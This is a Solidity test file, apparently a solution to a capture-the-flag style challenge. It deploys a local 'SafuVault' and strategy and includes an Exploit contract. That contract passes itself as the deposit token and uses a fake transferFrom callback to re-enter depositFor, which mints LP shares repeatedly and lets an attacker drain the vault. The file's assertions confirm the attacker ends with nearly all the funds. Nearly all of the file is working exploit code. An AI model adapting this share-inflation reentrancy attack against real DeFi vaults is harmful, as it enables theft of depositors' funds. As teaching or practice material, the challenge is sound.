// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {Utilities} from "../Utilities.sol";
import {Test} from "forge-std/Test.sol";
import {SafuVault} from "../../src/safu-vault/SafuVault.sol";
import {SafuStrategy} from "../../src/safu-vault/SafuStrategy.sol";
import {Token} from "../../src/Token.sol";
import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";

contract Exploit {
  uint256 private numLoops;
  SafuVault private immutable safuVault;
  IERC20 private immutable usdc;

  constructor(address _usdc, address _safuVault) {
    usdc = IERC20(_usdc);
    safuVault = SafuVault(_safuVault);
  }

  function run() public {
    uint256 balance = usdc.balanceOf(address(this));
    uint256 amountPerLoop = balance / 10;

    safuVault.depositFor(address(this), amountPerLoop, address(this));
    safuVault.withdrawAll();
    usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
  }

  function transferFrom(address, address, uint256 _amount) external {
    require(msg.sender == address(safuVault), "Invalid caller");

    if (numLoops < 10) {
      numLoops++;
      usdc.transfer(msg.sender, _amount);
      safuVault.depositFor(address(this), _amount, address(this));
    }
  }
}

contract SafuVaultTest is Test {
  Utilities private utils;
  address payable private attacker;

  Token private usdc;
  SafuVault private safuVault;
  SafuStrategy private safuStrategy;

  function setUp() public {
    utils = new Utilities();

    address payable[] memory users = utils.createUsers(1);
    attacker = users[0];
    vm.label(attacker, "Attacker");

    usdc = new Token("USDC", "USDC");
    usdc.mint(attacker, 10000);
    usdc.mint(address(this), 10000);

    assertEq(usdc.balanceOf(address(this)), 10000);

    safuStrategy = new SafuStrategy(address(usdc));
    safuVault = new SafuVault(address(safuStrategy), "LP Token", "LP");

    safuStrategy.setVault(address(safuVault));

    usdc.approve(address(safuVault), type(uint256).max);
    safuVault.depositAll();

    // Our deposit
    assertEq(safuVault.balance(), 10000);
    // Our LP shares
    assertEq(safuVault.balanceOf(address(this)), 10000);

    assertEq(safuVault.totalSupply(), 10000);
  }

  function testExploit() public {
    // Exploit start

    vm.startPrank(attacker);
    Exploit exploit = new Exploit(address(usdc), address(safuVault));
    usdc.transfer(address(exploit), usdc.balanceOf(attacker));
    exploit.run();
    vm.stopPrank();

    // Exploit end

    validate();
  }

  function validate() private {
    uint256 vaultFunds = usdc.balanceOf(address(safuVault));
    uint256 strategyFunds = usdc.balanceOf(address(safuStrategy));
    uint256 totalFunds = vaultFunds + strategyFunds;

    assertLt(totalFunds, 1000);
    assertGt(usdc.balanceOf(attacker), 19000);
  }
}
